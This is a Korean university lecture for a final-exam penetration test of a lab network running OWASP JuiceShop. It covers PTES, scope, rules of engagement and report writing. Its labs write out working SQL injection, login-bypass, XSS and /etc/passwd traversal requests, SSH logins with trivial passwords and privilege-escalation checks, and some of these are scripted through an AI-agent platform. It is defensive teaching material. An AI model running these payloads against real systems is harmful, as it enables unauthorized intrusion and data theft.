# Week 15: 기말 - 종합 침투 테스트

## 학습 목표

- PTES(Penetration Testing Execution Standard) 방법론을 이해한다
- 전문적인 침투 테스트 보고서 작성 형식을 익힌다
- 테스트 범위(Scope)와 교전 규칙(Rules of Engagement)을 설정할 수 있다
- 전체 실습 인프라에 대한 종합 침투 테스트를 수행한다
- 발견된 취약점을 체계적으로 분류하고 보고서로 작성한다

---

## 1. 침투 테스트 방법론 (PTES)

### 1.1 PTES란?

PTES(Penetration Testing Execution Standard)는 침투 테스트의 표준 방법론이다. 7단계로 구성된다.

```
┌─────────────────────────────────────────────┐
│  1. 사전 협의 (Pre-engagement Interactions)  │
│     → 범위, 규칙, 일정, 비용 합의            │
├─────────────────────────────────────────────┤
│  2. 정보 수집 (Intelligence Gathering)       │
│     → OSINT, 기술 스택, 네트워크 구조 파악    │
├─────────────────────────────────────────────┤
│  3. 위협 모델링 (Threat Modeling)            │
│     → 자산 식별, 위협 분류, 공격 경로 설계    │
├─────────────────────────────────────────────┤
│  4. 취약점 분석 (Vulnerability Analysis)     │
│     → 스캐닝, 수동 분석, 취약점 검증          │
├─────────────────────────────────────────────┤
│  5. 공격 실행 (Exploitation)                │
│     → 취약점 악용, 초기 접근, 권한 상승       │
├─────────────────────────────────────────────┤
│  6. 후속 공격 (Post-Exploitation)           │
│     → 정보 수집, 지속성, 수평 이동, 데이터 유출│
├─────────────────────────────────────────────┤
│  7. 보고서 작성 (Reporting)                 │
│     → 발견 사항, 위험도, 권고 사항, 증거      │
└─────────────────────────────────────────────┘
```

### 1.2 침투 테스트 유형

| 유형 | 사전 정보 | 설명 |
|------|-----------|------|
| **Black Box** | 없음 | 외부 공격자 시뮬레이션 |
| **White Box** | 전체 | 소스코드, 네트워크 구조 모두 제공 |
| **Gray Box** | 일부 | 일부 계정, 네트워크 정보 제공 |

> **본 시험**: Gray Box — 네트워크 구조와 SSH 계정이 제공됨

---

## 2. 범위(Scope)와 교전 규칙(Rules of Engagement)

### 2.1 테스트 범위

```
[범위 내 (In-Scope)]

서버:
  - opsclaw (10.20.30.201) — 공격 출발점
  - secu    (10.20.30.1)   — 방화벽/IPS
  - web     (10.20.30.80)  — 웹 서버 (JuiceShop:3000)
  - siem    (10.20.30.100) — SIEM

서비스:
  - HTTP (80, 3000)
  - SSH (22)
  - 모든 TCP/UDP 포트

[범위 외 (Out-of-Scope)]

  - 10.20.30.0/24 이외의 네트워크
  - 물리적 접근 공격
  - 소셜 엔지니어링
  - DoS/DDoS 공격
```

### 2.2 교전 규칙 (Rules of Engagement)

```
1. 모든 공격은 실습 네트워크(10.20.30.0/24)에서만 수행한다
2. 서비스 가용성을 의도적으로 저해하지 않는다 (DoS 금지)
3. 발견된 데이터를 외부로 유출하지 않는다
4. rm -rf /, 디스크 포맷 등 파괴적 명령을 실행하지 않는다
5. 모든 공격 활동을 기록한다 (OpsClaw 또는 수동 메모)
6. 설치한 지속성 메커니즘은 시험 종료 후 반드시 제거한다
7. 발견된 취약점은 보고서에만 기록하고 악용하지 않는다
```

---

## 3. 보고서 작성 형식

### 3.1 전문 침투 테스트 보고서 구조

```
1. 표지 (Cover Page)
   - 프로젝트명, 고객명, 테스터명, 날짜, 기밀등급

2. 경영진 요약 (Executive Summary)
   - 비기술적 언어로 전체 결과 요약 (1페이지)
   - 전체 위험도 평가 (Critical/High/Medium/Low 수)
   - 핵심 권고 사항

3. 테스트 개요 (Test Overview)
   - 범위, 방법론, 사용 도구, 일정

4. 발견 사항 (Findings)
   - 각 취약점별:
     a. 제목 및 위험도 (CVSS 점수)
     b. 영향받는 시스템/URL
     c. 상세 설명
     d. 재현 단계 (Step-by-step)
     e. 증거 (스크린샷, 명령어 출력)
     f. MITRE ATT&CK 매핑
     g. 권고 사항 (수정 방법)

5. 부록 (Appendix)
   - 전체 스캔 결과
   - 사용 도구 목록
   - ATT&CK Navigator Layer
```

### 3.2 CVSS (Common Vulnerability Scoring System)

취약점의 심각도를 0.0~10.0 점수로 평가하는 표준이다.

| 점수 범위 | 등급 | 색상 |
|-----------|------|------|
| 9.0~10.0 | Critical | 빨강 |
| 7.0~8.9 | High | 주황 |
| 4.0~6.9 | Medium | 노랑 |
| 0.1~3.9 | Low | 초록 |
| 0.0 | None | 회색 |

### 3.3 취약점 보고 예시

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[CRITICAL] F-01: SQL Injection — 제품 검색 API
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CVSS:     9.8 (Critical)
시스템:   web (10.20.30.80:3000)
URL:      /rest/products/search?q=
ATT&CK:   T1190 (Exploit Public-Facing Application)

[설명]
JuiceShop 제품 검색 API의 q 파라미터에서 SQL Injection이
가능하다. 공격자는 데이터베이스의 모든 데이터를 읽을 수 있으며,
관리자 인증을 우회할 수 있다.

[재현 단계]
1. 다음 URL에 접속한다:
   http://10.20.30.80:3000/rest/products/search?q=test' OR 1=1--
2. 모든 제품이 반환되면 취약점이 확인된 것이다.

[증거]
$ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--"
{"status":"success","data":[...전체 제품 목록...]}

[권고 사항]
- 파라미터화된 쿼리(Prepared Statement)를 사용한다
- 입력값 검증 및 이스케이핑을 적용한다
- WAF에 SQL Injection 탐지 규칙을 추가한다
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 4. 기말 시험 안내

### 4.1 시험 형식

| 항목 | 내용 |
|------|------|
| **시간** | 3시간 |
| **유형** | 실기 시험 (실습 환경에서 침투 테스트 수행) |
| **대상** | 전체 인프라 (opsclaw, secu, web, siem) |
| **제출물** | 침투 테스트 보고서 (Markdown) |

### 4.2 채점 기준

| 항목 | 배점 | 세부 기준 |
|------|------|-----------|
| **정찰** | 15점 | 포트 스캔, 서비스 식별, 기술 스택 파악 |
| **취약점 발견** | 30점 | 발견된 취약점 수와 심각도 |
| **공격 실행** | 20점 | 취약점 악용 성공 여부, 권한 상승 |
| **ATT&CK 매핑** | 10점 | 모든 공격의 정확한 ATT&CK ID 매핑 |
| **보고서 품질** | 15점 | 구조, 재현 가능성, 증거 포함 |
| **권고 사항** | 10점 | 실용적이고 구체적인 수정 방안 |
| **합계** | **100점** | |

### 4.3 추가 점수 (보너스)

| 항목 | 추가 점수 |
|------|-----------|
| OpsClaw 자동화 활용 | +5점 |
| ATT&CK Navigator Layer JSON 제출 | +3점 |
| 수동으로 찾기 어려운 취약점 발견 | +5점 |
| PoW 증거 체인을 보고서에 포함 | +2점 |

---

## 5. 실습: 종합 침투 테스트 수행

### 실습 1: 정찰 (15분)

```bash
# 환경 변수 설정
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

# === 전체 네트워크 스캔 ===

# 1. 각 서버 포트 스캔
echo "===== secu (10.20.30.1) ====="
nmap -sT -F 10.20.30.1

echo ""
echo "===== web (10.20.30.80) ====="
nmap -sT -F 10.20.30.80

echo ""
echo "===== siem (10.20.30.100) ====="
nmap -sT -F 10.20.30.100

# 2. 서비스 버전 탐지 (web 서버)
nmap -sV -p 22,80,3000 10.20.30.80

# 3. 웹 서비스 확인
curl -s -o /dev/null -w "JuiceShop: %{http_code}\n" http://10.20.30.80:3000/
curl -s -o /dev/null -w "Nginx/WAF: %{http_code}\n" http://10.20.30.80/

# 4. JuiceShop API 엔드포인트 탐색
curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -c 300
curl -s http://10.20.30.80:3000/rest/products/1 | python3 -m json.tool 2>/dev/null | head -20
```

### 실습 2: 취약점 분석 (30분)

```bash
# === 웹 취약점 테스트 ===

# 1. SQL Injection 테스트
echo "===== SQL Injection ====="
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"data\",[]))}개')" 2>/dev/null

# 2. 인증 우회 테스트
echo ""
echo "===== 인증 우회 ====="
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"\" or 1=1--","password":"a"}' | head -c 200

# 3. XSS 테스트
echo ""
echo "===== XSS 검사 ====="
curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | head -c 200

# 4. 디렉토리 트래버설 테스트
echo ""
echo "===== 디렉토리 트래버설 ====="
curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd" | head -5

# === 서버 취약점 테스트 ===

# 5. web 서버 권한 확인
echo ""
echo "===== 서버 권한 확인 ====="
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 "echo 1 | sudo -S -l 2>/dev/null"

# 6. SUID 검사
echo ""
echo "===== SUID 바이너리 ====="
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "find / -perm -4000 -type f 2>/dev/null"

# === 방화벽/IPS 분석 ===

# 7. secu 규칙 확인
echo ""
echo "===== nftables 규칙 ====="
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 \
  "sudo nft list ruleset 2>/dev/null | head -30"
```

### 실습 3: 공격 실행 (30분)

```bash
# === OpsClaw 자동화 공격 ===

# 프로젝트 생성
PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week15-final-pentest",
    "request_text": "기말 종합 침투 테스트",
    "master_mode": "external"
  }')
PID=$(echo "$PROJECT" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "프로젝트 ID: $PID"

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 정찰 + 공격 체인 실행
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "nmap -sT -p 22,80,3000 10.20.30.80 10.20.30.1 10.20.30.100",
        "risk_level": "low",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "curl -s http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1-- | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"SQLi: {len(d.get(\\\\\\\"data\\\\\\\",[]))}개 결과\\\")\" 2>/dev/null || echo SQLi test done",
        "risk_level": "medium",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"\\\\\\\" or 1=1--\\\",\\\"password\\\":\\\"a\\\"}\" | head -c 300",
        "risk_level": "medium",
        "subagent_url": "http://localhost:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "whoami && id && uname -r",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "sudo -l 2>/dev/null | head -10",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

### 실습 4: 증거 수집 및 보고서 작성 (45분)

```bash
# 증거 요약
echo "===== 증거 요약 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/$PID/evidence/summary" | python3 -m json.tool

# PoW 체인 검증
echo ""
echo "===== PoW 검증 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/verify?agent_id=http://localhost:8002" | python3 -m json.tool

# 작업 재생
echo ""
echo "===== 작업 타임라인 ====="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/projects/$PID/replay" | python3 -m json.tool
```

### 보고서 템플릿

시험 제출용 보고서는 아래 형식을 따른다. Markdown으로 작성한다.

```markdown
# 침투 테스트 보고서

## 1. 테스트 개요

| 항목 | 내용 |
|------|------|
| 프로젝트명 | 기말 종합 침투 테스트 |
| 테스터 | (이름, 학번) |
| 날짜 | 2026-03-27 |
| 범위 | 10.20.30.0/24 (secu, web, siem) |
| 유형 | Gray Box |
| 방법론 | PTES |

## 2. 경영진 요약

전체 인프라에 대한 침투 테스트 결과, 총 X개의 취약점을 발견했다.
- Critical: X개
- High: X개
- Medium: X개
- Low: X개

가장 심각한 위험은 (요약)이며, 즉시 조치가 필요하다.

## 3. 발견 사항

### F-01: [Critical] SQL Injection — 제품 검색 API
- **CVSS**: 9.8
- **시스템**: web (10.20.30.80:3000)
- **ATT&CK**: T1190
- **설명**: ...
- **재현 단계**:
  1. ...
  2. ...
- **증거**: (명령어와 출력 결과)
- **권고**: ...

### F-02: [High] sudo NOPASSWD:ALL 설정
- **CVSS**: 8.4
- **시스템**: web (10.20.30.80)
- **ATT&CK**: T1548.003
- ...

(각 취약점별 반복)

## 4. ATT&CK 매핑

| 공격 단계 | ATT&CK ID | 기법명 | 대상 서버 |
|-----------|-----------|--------|----------|
| 정찰 | T1046 | Network Service Scanning | 전체 |
| ... | ... | ... | ... |

## 5. 권고 사항 요약

| 우선순위 | 취약점 | 수정 방법 | 예상 소요 |
|----------|--------|-----------|-----------|
| 1 | F-01 SQLi | Prepared Statement 적용 | 2일 |
| 2 | F-02 sudo | sudoers 최소 권한 설정 | 1시간 |
| ... | ... | ... | ... |

## 6. 부록

### A. 전체 포트 스캔 결과
(nmap 출력 첨부)

### B. 사용 도구
- nmap, curl, sshpass, OpsClaw

### C. OpsClaw 프로젝트 ID
- Project ID: (프로젝트 ID)
- PoW 검증: valid=true, blocks=X
```

---

## 6. 시험 진행 팁

### 6.1 시간 배분

```
0:00 ~ 0:15  정찰 (포트 스캔, 서비스 식별)
0:15 ~ 0:45  취약점 분석 (웹, 서버, 네트워크)
0:45 ~ 1:15  공격 실행 (SQLi, 권한 상승, 우회)
1:15 ~ 1:30  후속 공격 (지속성, 수평 이동)
1:30 ~ 2:00  ATT&CK 매핑 및 정리
2:00 ~ 2:45  보고서 작성
2:45 ~ 3:00  최종 검토 및 제출
```

### 6.2 체크리스트

```
정찰:
  [ ] 전체 서버 포트 스캔 완료
  [ ] 서비스 버전 식별 완료
  [ ] 웹 애플리케이션 구조 파악

웹 공격:
  [ ] SQL Injection 테스트
  [ ] XSS 테스트
  [ ] 인증 우회 테스트
  [ ] 디렉토리 트래버설 테스트
  [ ] 파일 업로드 테스트

서버 공격:
  [ ] sudo 권한 확인 및 악용
  [ ] SUID 바이너리 검사
  [ ] Cron job 확인
  [ ] 권한 상승 시도

네트워크:
  [ ] 방화벽 규칙 분석
  [ ] IPS 우회 시도
  [ ] 서버 간 접근 테스트

보고서:
  [ ] 모든 취약점 문서화
  [ ] CVSS 점수 부여
  [ ] ATT&CK ID 매핑
  [ ] 재현 단계 작성
  [ ] 권고 사항 포함
  [ ] 증거(명령어 출력) 첨부
```

### 6.3 자주 사용하는 명령어 모음

```bash
# SSH 접속
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80

# 포트 스캔
nmap -sT -F 10.20.30.80

# 웹 요청
curl -s http://10.20.30.80:3000/rest/products/search?q=test

# OpsClaw API
export OPSCLAW_API_KEY="opsclaw-api-key-2026"
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" http://localhost:8000/projects

# 권한 확인
sudo -l
find / -perm -4000 -type f 2>/dev/null

# 로그 확인
sudo tail -20 /var/log/auth.log
sudo tail -20 /var/log/suricata/fast.log
```

---

## 7. 핵심 정리

- 침투 테스트는 **방법론(PTES)**을 따라 체계적으로 수행한다
- **범위와 교전 규칙**을 명확히 정의하고 준수한다
- 발견된 취약점은 **CVSS 점수와 ATT&CK ID**로 분류한다
- 보고서는 **비기술자도 이해할 수 있는 경영진 요약**을 포함한다
- **재현 가능한 단계와 증거**가 보고서의 핵심이다
- 침투 테스트의 목적은 파괴가 아니라 **보안 개선**이다

---

## 과정 총정리

| 주차 | 주제 | 핵심 기법 |
|------|------|-----------|
| 01 | 사이버보안 개론 | 기본 개념, CIA 3원칙 |
| 02 | 웹 정찰 | robots.txt, 디렉토리 스캔 |
| 03 | 클라이언트 공격 | HTML/JS 분석, 쿠키 조작 |
| 04 | XSS | Reflected, Stored XSS |
| 05 | SQL Injection | Union, Blind SQLi |
| 06 | Command Injection | OS 명령 실행 |
| 07 | 파일 공격 | 업로드, 트래버설 |
| 08 | CSRF/SSRF | 요청 위조 |
| 09 | 네트워크 공격 | 포트 스캔, 패킷 캡처 |
| 10 | IPS/방화벽 우회 | 인코딩, 터널링 |
| 11 | 권한 상승 | SUID, sudo, PATH |
| 12 | 지속성/흔적 제거 | SSH 키, cron, 로그 삭제 |
| 13 | MITRE ATT&CK | 프레임워크 매핑 |
| 14 | OpsClaw 자동화 | API 기반 침투 테스트 |
| **15** | **기말** | **종합 침투 테스트** |

> 이 과정에서 학습한 모든 기법은 **방어 역량 강화**를 위한 것이다.
> 허가 없이 타인의 시스템에 이 기법을 적용하는 것은 **불법**이다.
